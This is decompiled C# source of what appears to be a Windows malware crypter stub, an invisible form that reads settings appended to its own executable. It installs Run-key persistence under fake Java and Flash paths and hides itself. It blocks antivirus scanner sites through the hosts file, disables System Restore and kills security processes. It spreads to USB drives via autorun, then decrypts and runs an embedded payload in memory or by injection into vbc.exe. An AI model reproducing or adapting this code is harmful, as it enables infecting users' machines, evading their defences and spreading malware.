using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Reflection;
using System.Runtime.CompilerServices;
using System.Security.Cryptography;
using System.Text;
using System.Threading;
using System.Windows.Forms;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.VisualBasic.Devices;
using Microsoft.Win32;

namespace ns0;

[DesignerGenerated]
public class form1 : Form
{
	public class GClass0
	{
		[DebuggerNonUserCode]
		public GClass0()
		{
		}

		public static void smethod_0()
		{
			try
			{
				string text = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\Sun\\Java\\AU\\JUpdate.exe";
				if (File.Exists(text))
				{
					((ServerComputer)Class1.Class0_0).get_FileSystem().DeleteFile(text);
				}
				File.Copy(Application.get_ExecutablePath(), text);
				((ServerComputer)Class1.Class0_0).get_Registry().get_CurrentUser().OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", writable: true)!.SetValue("1" + Application.get_ProductName(), text);
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				ProjectData.ClearProjectError();
			}
		}

		public static void smethod_1()
		{
			try
			{
				string fileName = Path.GetFileName(Application.get_ExecutablePath());
				string text = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\Sun\\Java\\AU\\";
				((ServerComputer)Class1.Class0_0).get_FileSystem().CopyFile(Application.get_ExecutablePath(), text + fileName, true);
				RegistryKey registryKey = Registry.LocalMachine.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", writable: true);
				registryKey.SetValue(fileName, text);
				registryKey.Close();
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				ProjectData.ClearProjectError();
			}
		}

		public static void smethod_2()
		{
			try
			{
				string fileName = Path.GetFileName(Application.get_ExecutablePath());
				string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
				if (File.Exists(folderPath + "\\Adobe\\Flash Player\\AssetCache" + fileName))
				{
					((ServerComputer)Class1.Class0_0).get_FileSystem().DeleteFile(folderPath + "\\Adobe\\Flash Player\\AssetCache" + fileName);
				}
				File.Copy(Application.get_ExecutablePath(), folderPath + "\\Adobe\\Flash Player\\AssetCache" + fileName);
				((ServerComputer)Class1.Class0_0).get_Registry().SetValue("HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run", "Winlogon", (object)(folderPath + "\\Adobe\\Flash Player\\AssetCache" + fileName), RegistryValueKind.String);
				((ServerComputer)Class1.Class0_0).get_Registry().SetValue("HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run", "Firefox", (object)Assembly.GetEntryAssembly()!.Location, RegistryValueKind.String);
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				ProjectData.ClearProjectError();
			}
		}

		public static void smethod_3()
		{
			try
			{
				File.SetAttributes(Application.get_ExecutablePath(), FileAttributes.Hidden);
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				ProjectData.ClearProjectError();
			}
		}

		public static void smethod_4()
		{
			try
			{
				string path = "C:\\Windows\\System32\\drivers\\etc\\hosts";
				StreamWriter streamWriter = new StreamWriter(path, append: true);
				string value = "\n 127.0.0.1 www.virustotal.com";
				string text = "\n 127.0.0.1 www.bitdefender.com";
				string text2 = "\n 127.0.0.1 www.virusscan.jotti.org";
				string text3 = "\n 127.0.0.1 www.scanner.novirusthanks.org";
				streamWriter.Write(value);
				streamWriter.Write("\r\n" + text);
				streamWriter.Write("\r\n" + text2);
				streamWriter.Write("\r\n" + text3);
				streamWriter.Close();
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				ProjectData.ClearProjectError();
			}
		}

		public static void smethod_5()
		{
			try
			{
				((ServerComputer)Class1.Class0_0).get_Registry().SetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\SystemRestore", "DisableSR", (object)"1", RegistryValueKind.DWord);
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				ProjectData.ClearProjectError();
			}
		}

		public static void smethod_6()
		{
			try
			{
				string text = "HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced";
				((ServerComputer)Class1.Class0_0).get_Registry().SetValue(text, "Hidden", (object)"0", RegistryValueKind.DWord);
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				ProjectData.ClearProjectError();
			}
		}

		public static void smethod_7()
		{
			string[] logicalDrives = Environment.GetLogicalDrives();
			checked
			{
				int num = logicalDrives.Length - 1;
				int num2 = 0;
				while (true)
				{
					int num3 = num2;
					int num4 = num;
					if (num3 > num4)
					{
						break;
					}
					DriveInfo driveInfo = new DriveInfo(logicalDrives[num2]);
					if (driveInfo.DriveType == DriveType.Removable && driveInfo.IsReady)
					{
						try
						{
							if (!File.Exists(logicalDrives[num2] + "CheckUSB.exe"))
							{
								string fileName = Path.GetFileName(Application.get_ExecutablePath());
								File.Copy(fileName, logicalDrives[num2] + "CheckUSB", overwrite: true);
								((ServerComputer)Class1.Class0_0).get_FileSystem().WriteAllText(logicalDrives[num2] + "Boot.inf", "[autorun]" + Environment.NewLine + "open=" + logicalDrives[num2] + "CheckUSB" + Environment.NewLine + "shellexecute=" + logicalDrives[num2], true);
								File.SetAttributes(logicalDrives[num2] + "CheckUSB", FileAttributes.Hidden);
								File.SetAttributes(logicalDrives[num2] + "Boot.inf", FileAttributes.Hidden);
							}
						}
						catch (Exception projectError)
						{
							ProjectData.SetProjectError(projectError);
							ProjectData.ClearProjectError();
						}
					}
					num2++;
				}
			}
		}

		public static void smethod_8()
		{
			Process[] processes = Process.GetProcesses();
			checked
			{
				int num = processes.Length - 1;
				int num2 = 0;
				while (true)
				{
					int num3 = num2;
					int num4 = num;
					if (num3 <= num4)
					{
						string text = Strings.LCase(processes[num2].ProcessName);
						if (Operators.CompareString(text, "outpost", false) == 0)
						{
							processes[num2].Kill();
						}
						num2++;
						continue;
					}
					break;
				}
			}
		}

		public static void smethod_9()
		{
			Process[] processes = Process.GetProcesses();
			checked
			{
				int num = processes.Length - 1;
				int num2 = 0;
				while (true)
				{
					int num3 = num2;
					int num4 = num;
					if (num3 <= num4)
					{
						string text = Strings.LCase(processes[num2].ProcessName);
						if (Operators.CompareString(text, "npfmsg", false) == 0)
						{
							processes[num2].Kill();
						}
						num2++;
						continue;
					}
					break;
				}
			}
		}

		public static void smethod_10()
		{
			Process[] processes = Process.GetProcesses();
			checked
			{
				int num = processes.Length - 1;
				int num2 = 0;
				while (true)
				{
					int num3 = num2;
					int num4 = num;
					if (num3 <= num4)
					{
						string text = Strings.LCase(processes[num2].ProcessName);
						if (Operators.CompareString(text, "bdagent", false) == 0)
						{
							processes[num2].Kill();
						}
						num2++;
						continue;
					}
					break;
				}
			}
		}

		public static void smethod_11()
		{
			Process[] processes = Process.GetProcesses();
			checked
			{
				int num = processes.Length - 1;
				int num2 = 0;
				while (true)
				{
					int num3 = num2;
					int num4 = num;
					if (num3 <= num4)
					{
						string text = Strings.LCase(processes[num2].ProcessName);
						if (Operators.CompareString(text, "egui", false) == 0)
						{
							processes[num2].Kill();
						}
						num2++;
						continue;
					}
					break;
				}
			}
		}

		public static void smethod_12()
		{
			Process[] processes = Process.GetProcesses();
			checked
			{
				int num = processes.Length - 1;
				int num2 = 0;
				while (true)
				{
					int num3 = num2;
					int num4 = num;
					if (num3 <= num4)
					{
						string text = Strings.LCase(processes[num2].ProcessName);
						if (Operators.CompareString(text, "zlclient", false) == 0)
						{
							processes[num2].Kill();
						}
						num2++;
						continue;
					}
					break;
				}
			}
		}
	}

	public class GClass1
	{
		private string string_0;

		public string String_0
		{
			get
			{
				return string_0;
			}
			set
			{
				string_0 = value;
			}
		}

		public GClass1(string string_1)
		{
			string_0 = "";
			String_0 = string_1;
		}

		public GClass1()
		{
			string_0 = "";
			String_0 = "";
		}

		public byte[] method_0(byte[] byte_0)
		{
			byte_0 = method_2(byte_0, Encoding.Default.GetBytes(String_0));
			checked
			{
				byte[] array = new byte[byte_0.Length - 2 + 1];
				for (int i = byte_0.Length - 1; i >= 1; i += -1)
				{
					array[i - 1] = method_1(byte_0[i], (short)unchecked(-byte_0[checked(i - 1)]));
				}
				return array;
			}
		}

		private byte method_1(byte byte_0, short short_0)
		{
			while (short_0 < 0)
			{
				short_0 = checked((short)(short_0 + 256));
			}
			return Convert.ToByte(checked((short)unchecked(byte_0 + short_0)) % 256);
		}

		private byte[] method_2(byte[] byte_0, byte[] byte_1)
		{
			if (byte_1.Length != 0)
			{
				int num = checked(byte_0.Length - 1);
				int num2 = 0;
				while (true)
				{
					int num3 = num2;
					int num4 = num;
					if (num3 > num4)
					{
						break;
					}
					byte_0[num2] = (byte)(byte_0[num2] ^ method_1(byte_1[num2 % byte_1.Length], byte_1[(int)byte_1[num2 % byte_1.Length] % byte_1.Length]) ^ byte_1[checked(num2 + unchecked(num2 % 7)) % byte_1.Length % byte_1.Length]);
					num2 = checked(num2 + 1);
				}
			}
			return byte_0;
		}

		public string method_3(string string_1, string string_2)
		{
			return Encoding.Default.GetString(method_2(Encoding.Default.GetBytes(string_1), Encoding.Default.GetBytes(string_2)));
		}
	}

	public class GClass2
	{
		[DebuggerNonUserCode]
		public GClass2()
		{
		}

		public static string smethod_0(string string_0, string string_1)
		{
			return Encoding.Default.GetString(smethod_1(Encoding.Default.GetBytes(string_0), Encoding.Default.GetBytes(string_1)));
		}

		public static byte[] smethod_1(byte[] byte_0, byte[] byte_1)
		{
			checked
			{
				for (int i = byte_0.Length - 1; i >= 0; i += -1)
				{
					byte_0[i] = (byte)unchecked(checked((byte_0[i] ^ byte_1[unchecked(i % byte_1.Length)]) - unchecked((int)byte_0[checked(i + 1) % byte_0.Length]) + 256) % 256);
				}
				return byte_0;
			}
		}
	}

	private static List<WeakReference> list_0 = new List<WeakReference>();

	private IContainer icontainer_0;

	private const string string_0 = "BXkAZzqW2N047kvRtKlKHitam8Dfd24Yp1yTaWCyZOTD3pSMTSnBZRcxJRQspkt2cv724s";

	private string string_1;

	private string string_2;

	private bool bool_0;

	public form1()
	{
		((Form)this).add_Load((EventHandler)form1_Load);
		lock (list_0)
		{
			list_0.Add(new WeakReference(this));
		}
		string_2 = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\";
		bool_0 = false;
		InitializeComponent();
	}

	[DebuggerNonUserCode]
	protected override void Dispose(bool disposing)
	{
		try
		{
			if ((disposing && icontainer_0 != null) ? true : false)
			{
				icontainer_0.Dispose();
			}
		}
		finally
		{
			((Form)this).Dispose(disposing);
		}
	}

	[DebuggerStepThrough]
	private void InitializeComponent()
	{
		((Control)this).SuspendLayout();
		SizeF autoScaleDimensions = new SizeF(6f, 13f);
		((ContainerControl)this).set_AutoScaleDimensions(autoScaleDimensions);
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
		Size clientSize = new Size(1, 1);
		((Form)this).set_ClientSize(clientSize);
		((Form)this).set_FormBorderStyle((FormBorderStyle)0);
		((Control)this).set_Name("form1");
		((Form)this).set_Opacity(0.0);
		((Form)this).set_ShowIcon(false);
		((Form)this).set_ShowInTaskbar(false);
		((Control)this).ResumeLayout(false);
	}

	private void form1_Load(object sender, EventArgs e)
	{
		//IL_0080: Unknown result type (might be due to invalid IL or missing references)
		byte[] bytes = Class10.smethod_0(Application.get_ExecutablePath());
		string @string = Encoding.Default.GetString(bytes);
		string[] array = Strings.Split(@string, "BXkAZzqW2N047kvRtKlKHitam8Dfd24Yp1yTaWCyZOTD3pSMTSnBZRcxJRQspkt2cv724s", -1, (CompareMethod)0);
		string text = array[1];
		string string_ = array[2];
		string text2 = array[6];
		string text3 = array[10];
		string text4 = array[11];
		string text5 = array[12];
		string text6 = array[13];
		string text7 = array[14];
		string text8 = array[15];
		string text9 = array[16];
		string text10 = array[17];
		string text11 = array[20];
		try
		{
			if (Operators.CompareString(text6, "Activated", false) == 0)
			{
				MessageBox.Show(text7, text8, (MessageBoxButtons)0);
			}
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
		if (Operators.CompareString(text4, "own", false) == 0)
		{
			text4 = Process.GetCurrentProcess().MainModule!.FileName;
		}
		if (Operators.CompareString(text, "true", false) == 0)
		{
			GClass0.smethod_0();
		}
		if (Operators.CompareString(text, "star2", false) == 0)
		{
			GClass0.smethod_1();
		}
		if (Operators.CompareString(text, "star3", false) == 0)
		{
			GClass0.smethod_2();
		}
		if (Operators.CompareString(text2, "true", false) == 0)
		{
			GClass0.smethod_3();
		}
		if (Operators.CompareString(text9, "true", false) == 0)
		{
			GClass0.smethod_5();
		}
		if (Operators.CompareString(text10, "true", false) == 0)
		{
			GClass0.smethod_6();
		}
		if (Operators.CompareString(text3, "true", false) == 0)
		{
			GClass0.smethod_8();
			GClass0.smethod_9();
			GClass0.smethod_10();
			GClass0.smethod_11();
			GClass0.smethod_12();
		}
		if (Operators.CompareString(text5, "true", false) == 0)
		{
			GClass0.smethod_7();
		}
		if (Operators.CompareString(text11, "des", false) == 0)
		{
			string_1 = smethod_2(array[3], string_, bool_1: true);
		}
		if (Operators.CompareString(text11, "Rijndael", false) == 0)
		{
			string_1 = Conversions.ToString(smethod_3(array[3], string_));
		}
		if (Operators.CompareString(text11, "Stairs", false) == 0)
		{
			string_1 = GClass2.smethod_0(array[3], string_);
		}
		bool flag = Class7.smethod_0();
		if (Operators.CompareString(array[7], "NULL", false) != 0)
		{
			try
			{
				byte[] bytes2 = method_3(array[7]);
				File.WriteAllBytes(string_2 + array[8], bytes2);
				Process.Start(string_2 + array[8]);
			}
			catch (Exception projectError2)
			{
				ProjectData.SetProjectError(projectError2);
				ProjectData.ClearProjectError();
			}
		}
		if (flag)
		{
			try
			{
				if (method_1())
				{
					Thread thread = new Thread(delegate(object object_0)
					{
						method_2(Conversions.ToString(object_0));
					});
					thread.TrySetApartmentState(ApartmentState.STA);
					thread.Start(smethod_2(array[3], string_, bool_1: true));
					((Form)this).Close();
				}
				else
				{
					Thread thread2 = new Thread(delegate(object object_0)
					{
						method_2(Conversions.ToString(object_0));
					});
					thread2.TrySetApartmentState(ApartmentState.STA);
					byte[] bytes3 = Encoding.Default.GetBytes(string_1);
					try
					{
						thread2.Start(smethod_2(string_1, "C:\\WINDOWS\\Microsoft.NET\\Framework\\v2.0.50727\\vbc.exe", bool_1: true));
					}
					catch (Exception projectError3)
					{
						ProjectData.SetProjectError(projectError3);
						GClass3.smethod_0(bytes3, "C:\\WINDOWS\\Microsoft.NET\\Framework\\v2.0.50727\\vbc.exe");
						ProjectData.ClearProjectError();
					}
				}
			}
			catch (Exception projectError4)
			{
				ProjectData.SetProjectError(projectError4);
				Process.GetCurrentProcess().Kill();
				ProjectData.EndApp();
				ProjectData.ClearProjectError();
			}
		}
		if (flag)
		{
			return;
		}
		try
		{
			if (method_1())
			{
				Thread thread3 = new Thread(delegate(object object_0)
				{
					method_2(Conversions.ToString(object_0));
				});
				thread3.TrySetApartmentState(ApartmentState.STA);
				thread3.Start(smethod_2(array[3], string_, bool_1: true));
				((Form)this).Close();
			}
			else
			{
				new GClass3();
				byte[] bytes4 = Encoding.Default.GetBytes(string_1);
				GClass3.smethod_0(bytes4, text4);
			}
		}
		catch (Exception projectError5)
		{
			ProjectData.SetProjectError(projectError5);
			Process.GetCurrentProcess().Kill();
			ProjectData.EndApp();
			ProjectData.ClearProjectError();
		}
	}

	private void method_0(byte[] byte_0)
	{
		Assembly assembly = Assembly.Load(byte_0);
		MethodInfo entryPoint = assembly.EntryPoint;
		object objectValue = RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(assembly.CreateInstance(entryPoint.Name))));
		entryPoint.Invoke(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(objectValue))), new object[1] { new string[1] { "1" } });
	}

	private bool method_1()
	{
		if (string_1.Contains("</assembly>"))
		{
			string[] array = Strings.Split(string_1, "</assembly>", -1, (CompareMethod)0);
			if (Operators.CompareString(array[1].ToLower(), "", false) != 0)
			{
				return true;
			}
			bool result = default(bool);
			return result;
		}
		return false;
	}

	public void method_2(string string_3)
	{
		byte[] bytes = Encoding.GetEncoding(1252).GetBytes(string_3);
		Thread thread = new Thread(delegate(object object_0)
		{
			method_0((byte[])object_0);
		});
		thread.TrySetApartmentState(ApartmentState.STA);
		thread.Start(bytes);
		((Form)this).Close();
	}

	public byte[] method_3(string string_3)
	{
		if (string_3 == null)
		{
			throw new ArgumentNullException("base64");
		}
		return Convert.FromBase64String(string_3);
	}

	public static byte[] smethod_0(byte[] byte_0, byte[] byte_1)
	{
		byte[] array = new byte[256];
		checked
		{
			int num = array.Length - 1;
			int num2 = 0;
			while (true)
			{
				int num3 = num2;
				int num4 = num;
				if (num3 > num4)
				{
					break;
				}
				array[num2] = (byte)num2;
				num2++;
			}
			int num5 = array.Length - 1;
			num2 = 0;
			int num7 = default(int);
			while (true)
			{
				int num6 = num2;
				int num4 = num5;
				if (num6 > num4)
				{
					break;
				}
				num7 = (num7 + unchecked((int)byte_1[num2 % byte_1.Length]) + unchecked((int)array[num2])) & 0xFF;
				byte b = array[num2];
				array[num2] = array[num7];
				array[num7] = b;
				num2++;
			}
			num2 = 0;
			num7 = 0;
			byte[] array2 = new byte[byte_0.Length - 1 + 1];
			int num8 = byte_0.Length - 1;
			int num9 = 0;
			while (true)
			{
				int num10 = num9;
				int num4 = num8;
				if (num10 > num4)
				{
					break;
				}
				num2 = (num2 + 1) & 0xFF;
				num7 = (num7 + unchecked((int)array[num2])) & 0xFF;
				byte b2 = array[num2];
				array[num2] = array[num7];
				array[num7] = b2;
				unchecked
				{
					array2[num9] = (byte)(array[checked(unchecked((int)array[num2]) + unchecked((int)array[num7])) & 0xFF] ^ byte_0[num9]);
				}
				num9++;
			}
			return array2;
		}
	}

	public static string smethod_1(string string_3, string string_4)
	{
		string text = "";
		checked
		{
			long num = (long)Math.Round((double)Strings.Len(string_4) / 2.0);
			long num2 = 1L;
			while (true)
			{
				long num3 = num2;
				long num4 = num;
				if (num3 > num4)
				{
					break;
				}
				int num5 = (int)Math.Round(Conversion.Val("&H" + Strings.Mid(string_4, (int)(2L * num2 - 1L), 2)));
				int num6 = Strings.Asc(Strings.Mid(string_3, (int)(unchecked(num2 % Strings.Len(string_3)) + 1L), 1));
				text += Conversions.ToString(Strings.Chr(num5 ^ num6));
				num2++;
			}
			return text;
		}
	}

	public static string smethod_2(string string_3, string string_4, bool bool_1)
	{
		byte[] array = Convert.FromBase64String(string_3);
		byte[] key;
		if (bool_1)
		{
			MD5CryptoServiceProvider mD5CryptoServiceProvider = new MD5CryptoServiceProvider();
			key = mD5CryptoServiceProvider.ComputeHash(Encoding.UTF8.GetBytes(string_4));
		}
		else
		{
			key = Encoding.UTF8.GetBytes(string_4);
		}
		TripleDESCryptoServiceProvider tripleDESCryptoServiceProvider = new TripleDESCryptoServiceProvider();
		tripleDESCryptoServiceProvider.Key = key;
		tripleDESCryptoServiceProvider.Mode = CipherMode.ECB;
		tripleDESCryptoServiceProvider.Padding = PaddingMode.PKCS7;
		ICryptoTransform cryptoTransform = tripleDESCryptoServiceProvider.CreateDecryptor();
		byte[] bytes = cryptoTransform.TransformFinalBlock(array, 0, array.Length);
		return Encoding.UTF8.GetString(bytes);
	}

	public static object smethod_3(string string_3, string string_4)
	{
		RijndaelManaged rijndaelManaged = new RijndaelManaged();
		byte[] salt = new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 };
		Rfc2898DeriveBytes rfc2898DeriveBytes = new Rfc2898DeriveBytes(string_4, salt);
		rijndaelManaged.Key = rfc2898DeriveBytes.GetBytes(rijndaelManaged.Key.Length);
		rijndaelManaged.IV = rfc2898DeriveBytes.GetBytes(rijndaelManaged.IV.Length);
		MemoryStream memoryStream = new MemoryStream();
		CryptoStream cryptoStream = new CryptoStream(memoryStream, rijndaelManaged.CreateDecryptor(), CryptoStreamMode.Write);
		try
		{
			byte[] array = Convert.FromBase64String(string_3);
			cryptoStream.Write(array, 0, array.Length);
			cryptoStream.Close();
			string_3 = Encoding.UTF8.GetString(memoryStream.ToArray());
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
		return string_3;
	}

	[SpecialName]
	[CompilerGenerated]
	[DebuggerStepThrough]
	private void method_4(object object_0)
	{
		method_2(Conversions.ToString(object_0));
	}

	[SpecialName]
	[CompilerGenerated]
	[DebuggerStepThrough]
	private void method_5(object object_0)
	{
		method_2(Conversions.ToString(object_0));
	}

	[SpecialName]
	[DebuggerStepThrough]
	[CompilerGenerated]
	private void method_6(object object_0)
	{
		method_2(Conversions.ToString(object_0));
	}

	[SpecialName]
	[DebuggerStepThrough]
	[CompilerGenerated]
	private void method_7(object object_0)
	{
		method_0((byte[])object_0);
	}
}
